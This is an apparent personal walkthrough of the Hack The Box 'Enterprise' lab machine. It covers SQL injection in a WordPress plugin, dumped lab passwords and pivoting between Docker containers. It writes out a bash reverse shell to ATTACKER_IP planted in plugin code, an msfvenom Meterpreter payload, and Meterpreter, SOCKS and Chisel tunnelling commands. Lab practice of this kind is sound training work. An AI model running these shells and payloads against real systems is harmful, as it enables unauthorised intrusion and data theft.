HTB Enterprise

Target: 10.129.95.30
OS: Linux (Dockerized)
Difficulty: Medium

Enumeration

Nmap found 5 ports:
- 22 SSH OpenSSH 7.4p1 Ubuntu
- 80 HTTP Apache 2.4.10 (Debian) WordPress 4.8.1
- 443 HTTPS Apache 2.4.25 (Ubuntu) default page, SSL cert for enterprise.local
- 8080 HTTP Apache 2.4.10 (Debian) Joomla 3.7.5
- 32812 Unknown custom service LCARS "Library Computer Access and Retrieval System" asks for Bridge Access Code

WordPress (port 80)
- wpscan found one user: william.riker
- XML-RPC multicall brute force with rockyou found nothing
- No vulnerable plugins/themes from searchsploit

Joomla (port 8080)
- joomscan confirmed version 3.7.5
- Admin panel at /administrator/
- SQLmap on login form found nothing
- LDAP injection CVE-2017-14596 tested but LDAP auth not enabled

HTTPS (port 443)
- Default Apache page
- SSL cert CN=enterprise.local
- Gobuster with -k flag for SSL found /files/ directory and the lcars WordPress plugin files

LCARS (port 32812)
- Custom Star Trek themed service
- Asks for "Bridge Access Code"
- Tried all found passwords, none worked

Foothold

SQL Injection in WordPress LCARS plugin

Found the lcars plugin on port 443 with gobuster. Three PHP files:
- lcars.php placeholder, no functionality
- lcars_dbpost.php casts query to (int), not injectable
- lcars_db.php NO sanitization, raw $_GET['query'] into SQL

Vulnerable endpoint:
http://10.129.95.30/wp-content/plugins/lcars/lcars_db.php?query=1

The code does echo $result on a mysqli_result object so it errors out, but blind SQLi works.

sqlmap -u "http://10.129.95.30/wp-content/plugins/lcars/lcars_db.php?query=1" --dbs

Found 6 databases including wordpress and joomla.

Dumped wp_posts and found a draft post called "Passwords" with:
- ZxJyhGem4k338S2Y
- enterprisencc170
- ZD3YxfnSjezg67JZ
- u*Z14ru0p#ttj83zS6

wp_users had william.riker's hash but it was uncrackable.

WordPress Admin Access

Sprayed the 4 passwords against william.riker on /wp-login.php and got in.

Went to Plugins > Editor, edited the lcars plugin PHP file with a reverse shell:
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/1234 0>&1'"); ?>

Triggered it by visiting:
http://10.129.95.30/wp-content/plugins/lcars/lcars_db.php

Got a shell as www-data inside Docker container b8319d86d21e.

Internal Enumeration

wp-config.php revealed:
- DB_USER: root
- DB_PASSWORD: NCC-1701E
- DB_HOST: mysql (Docker internal hostname)

Found sqlShell.php in webroot, a browser-based MySQL shell also using NCC-1701E.

Used the browser SQL shell to connect to the joomla database on host "mysql" with root:NCC-1701E.

Joomla Admin Access

Dumped joomla users table through the SQL shell and got admin creds.
Logged into Joomla admin at 10.129.95.30:8080/administrator/

Edited a Joomla template PHP file with a reverse shell.
Got shell as www-data inside a different Docker container a7018bfdc454.

Docker Container Notes

This box runs multiple Docker containers:
- WordPress container (b8319d86d21e) on port 80
- Joomla container (a7018bfdc454) on port 8080
- MySQL container on internal network (hostname: mysql)
- LCARS service on port 32812
- HTTPS/Apache on port 443

Containers share a /files/ directory (world-writable, owned by root) which is likely a Docker volume mounted from the host.

Check /etc/hosts inside containers to see internal IPs.
Check entrypoint.sh for container setup details.

Pivoting with Metasploit

Meterpreter Port Forwarding

Generate a payload matching the target architecture:
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f elf -o msf.bin

Set up handler in msfconsole:
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST ATTACKER_IP
set LPORT 4444
run -j

IMPORTANT: handler LHOST and LPORT must match msfvenom payload exactly.

Upload and execute msf.bin on the container. Once session is active:

Forward internal MySQL port to Kali:
portfwd add -l 8003 -p 3306 -r MYSQL_CONTAINER_IP

portfwd is a Meterpreter command, must be run inside an active session (sessions -i ID), not from the msf handler prompt.

Then connect from Kali:
mysql -h 127.0.0.1 -P 8003 -u root -p'NCC-1701E' joomla

Kill port forwards: portfwd delete -l 8003 -p 3306 -r MYSQL_CONTAINER_IP

SOCKS Proxy with Metasploit (for proxychains)

Set up SOCKS proxy server in msfconsole:
use auxiliary/server/socks_proxy
set SRVPORT 1080
run -j

Add a route through the Meterpreter session to reach internal network:
route add 172.17.0.0/16 SESSION_ID

Configure /etc/proxychains.conf on Kali:
socks5 127.0.0.1 1080

Now any tool can reach internal services through proxychains:
proxychains mysql -h MYSQL_CONTAINER_IP -u root -p'NCC-1701E' joomla
proxychains nmap -sT -Pn INTERNAL_IP

Alternative Pivoting with Chisel

On Kali (server):
chisel server -p 8888 --reverse

On container (client):
./chisel client ATTACKER_IP:8888 R:socks

Configure /etc/proxychains.conf:
socks5 127.0.0.1 1080

Then use proxychains as above.

Useful Docker Enumeration Commands

Check if in Docker: ls -la /.dockerenv
Container ID: cat /etc/hostname
Internal IPs: cat /etc/hosts OR hostname -I OR ip a
Mounted volumes: mount | grep -v proc
Capabilities: capsh --print
Cgroups: cat /proc/1/cgroup
Disks: fdisk -l OR ls -la /dev/sd*

Shell Stabilization in Containers

python3 -c 'import pty;pty.spawn("/bin/bash")'
OR
script /dev/null -c bash

Then Ctrl+Z and:
stty raw -echo; fg
export TERM=xterm

Privesc / Container Escape

TODO: check /files/ shared directory for host filesystem access
TODO: check capabilities and mounted volumes
TODO: try LCARS port 32812 access code
TODO: check entrypoint.sh for useful info

Credentials Found

william.riker : (one of the 4 passwords) WordPress admin
root : NCC-1701E MySQL root
Joomla admin : (from joomla DB dump)

Password dump from wp_posts draft:
ZxJyhGem4k338S2Y
enterprisencc170
ZD3YxfnSjezg67JZ
u*Z14ru0p#ttj83zS6

Key Lessons

1. Always check ALL ports, especially unusual high ports like 32812
2. Read actual website content, dont just scan. The passwords were in a WordPress draft post
3. Check for multiple PHP files in plugins, one may be sanitized (int cast) while another isnt
4. Docker containers mean you need to pivot. Check /etc/hosts for internal hostnames
5. Browser-based SQL shells (sqlShell.php) can be faster than setting up tunnels
6. portfwd is a Meterpreter session command, not a handler command
7. Metasploit SOCKS proxy needs both the auxiliary/server/socks_proxy module AND a route through the session
8. msfvenom payload LHOST/LPORT must match handler LHOST/LPORT exactly
